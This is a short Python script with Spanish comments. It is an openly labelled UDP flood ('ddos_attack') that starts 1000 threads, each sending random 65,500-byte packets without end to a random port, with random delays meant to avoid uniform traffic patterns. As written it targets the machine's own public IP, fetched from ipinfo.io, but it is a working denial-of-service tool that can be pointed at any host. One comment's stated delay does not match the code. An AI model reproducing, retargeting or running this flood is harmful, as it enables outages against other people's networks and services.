import socket
import threading
import time
import requests
import random

def get_public_ip():
    response = requests.get('https://ipinfo.io/ip')
    return response.text.strip()

def ddos_attack(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    print(f"Atacando {target_ip}:{target_port} durante {duration} segundos...")
    start_time = time.time()

    while duration is None or time.time() - start_time < duration:
        try:
            # Datos aleatorios para variar el contenido
            data = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=65500)).encode()
            sock.sendto(data, (target_ip, target_port))
        except:
            pass

        # Espera aleatoria entre 0.0001 y 0.001 segundos para evitar patrones uniformes
        time.sleep(random.uniform(0.0001, 0.001))

if __name__ == "__main__":
    public_ip = get_public_ip()
    target_ip = public_ip
    target_port = random.randint(1024, 65535)  # Puerto objetivo aleatorio
    duration_seconds = None

    # Iniciar hilos con retraso aleatorio para evitar picos de tráfico
    threads = []
    for _ in range(1000):
        t = threading.Thread(target=ddos_attack, args=(target_ip, target_port, duration_seconds))
        # Retraso aleatorio entre 0.1 y 1 segundo antes de iniciar cada hilo
        time.sleep(random.uniform(0.0001, 0.0001))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()
